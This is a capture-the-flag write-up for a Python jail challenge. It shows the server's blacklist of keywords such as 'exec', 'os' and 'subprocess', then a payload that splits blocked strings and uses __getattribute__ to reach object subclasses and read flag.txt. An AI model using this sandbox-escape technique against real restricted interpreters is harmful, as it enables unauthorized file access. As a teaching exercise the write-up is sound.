# misc/foobarjail

## Description

How dare you tresspass, my friend?
nc chall.nitdgplug.org 30077

Downloads:
[chall](chall)

## Solution

For this challenge we are given the `server.py`:

```python
#!/usr/bin/env python 

from __future__ import print_function

print("=========================")
print("  WELCOME TO FOOBAR JAIL ")
print("=========================")

blacklist = [
    "import",
    "exec",
    "eval",
    "os",
    "pickle",
    "subprocess",
    "input",
    "blacklist",
    "sys",
    "ls",
    "cat",
    "echo",
    "la",
    "flag",
    "tac",
    "grep",
    "find"
]

builtin = __builtins__.__dict__.keys()
builtin.remove('raw_input')
builtin.remove('print')
for modules in builtin:
    del __builtins__.__dict__[modules]

while 1 == 1:
    try:
        print(">>>", end=' ')
        val = raw_input()
        
        for word in blacklist:
            if word.lower() in val.lower():
                print("Sorry!! You cannot use that here.")
                break
            else: 
                exec val   
    except:
        print ("What are you doing ? :(")
        continue
```
    
This is a typical python jail challenge. The usual approach for such a challenge is to get access to builtin functions
via the payload `{}.__class__.__base__.__subclasses__()`. With this it's then possible to read arbitrary files.
In our case, however, it is not possible to directly call `__class__` and `__subclasses__` since they contain the string
`la`. To bypass the blacklist, I used the `__getattribute__` function as follows:

```python
{}.__getattribute__("__cl" + "ass__").__base__.__getattribute__({}.__getattribute__("__cl" + "ass__").__base__, "__subcl" + "asses__")()
```

With this I could then read the flag:

```python
{}.__getattribute__("__cl" + "ass__").__base__.__getattribute__({}.__getattribute__("__cl" + "ass__").__base__, "__subcl" + "asses__")()[40]("fl" + "ag.txt").read()
```

Note that I had to pass the filename as `"fl" + "ag.txt"` to bypass the blacklist once again. This gave the flag `GLUG{h4v3_4_n!c3_e5c4p3_WKMN1IM7FU}`.

